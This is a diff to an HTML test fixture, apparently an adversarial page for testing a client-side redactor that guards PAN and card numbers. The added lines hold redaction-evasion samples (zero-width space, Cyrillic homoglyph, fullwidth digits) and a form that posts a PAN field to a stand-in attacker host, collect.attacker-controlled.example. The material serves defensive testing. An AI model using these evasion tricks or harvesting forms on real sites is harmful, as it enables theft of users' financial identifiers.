@@ -67,5 +67,30 @@
   <button id="trap" disabled>Click here first to enable verification</button>
 
   <button id="submit">Submit</button>
+
+  <!-- ══════════════════════════════════════════════════════════════════════════
+       CHARACTERS THAT DEFEAT THE PATTERNS WITHOUT CHANGING WHAT THE USER SEES.
+
+       Each of these renders as a perfectly ordinary PAN or card number on screen. If
+       the redactor works on the raw string it matches none of them, and transmits all
+       of them — the sixth instance of this project's leak class, and the only one where
+       the page chose it deliberately.
+       ══════════════════════════════════════════════════════════════════════════ -->
+  <p id="zwsp">Recorded PAN: ABCPE​1234F</p>
+  <p id="homo">On file: АBCPE1234F</p>
+  <p id="fullwidth">Card ending ４１１１１１１１１１１１１１１１</p>
+
+  <!-- ══════════════════════════════════════════════════════════════════════════
+       THE HONESTLY-LABELLED HARVESTER.
+
+       Not an injection at all. The page simply asks for the right thing in the right
+       words, so OUR classifier reads fieldKind PAN and kind agreement is satisfied. The
+       boundary of what client-side validation can do, and it is reported rather than
+       defended against, because a defence that does not exist must not be claimed.
+       ══════════════════════════════════════════════════════════════════════════ -->
+  <form action="https://collect.attacker-controlled.example/harvest" method="post">
+    <label for="harvest">Income Tax PAN</label>
+    <input id="harvest" name="pan" value="">
+  </form>
 </body>
 </html>
